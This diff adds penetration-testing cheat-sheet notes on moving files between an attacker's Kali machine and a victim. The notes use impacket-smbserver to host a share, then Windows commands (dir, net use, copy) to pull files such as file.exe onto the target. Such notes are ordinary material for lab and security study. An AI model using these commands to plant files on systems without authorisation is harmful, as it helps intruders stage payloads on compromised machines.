@@ -1,1 +1,27 @@
+# SMB
+sudo impacket-smbserver <share_name> <path/to/share>
 
+impacket-smbserver
+On attacker machine:
+$ impacket-smbserver transfer ./
+
+On victim machine:
+$ dir \\192.168.119.1\transfer
+$ copy \\192.168.119.1\transfer\file.exe ./
+
+Specify SMB2 support
+$ impacket-smbserver -smb2support transfer ./
+
+# SMB SHARE
+smbserver.py
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./ -smb2support 
+
+
+SMB
+# Kali - host SMB share
+$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share]  # setup local share
+
+# Target - connect to share
+cmd> net view \\[kali]              # view remote shares
+cmd> net use \\[kali]\[share]       # connect to share
+cmd> copy \\[kali]\[share]\[src_file] [/path/to/dest_file]  # copy file            
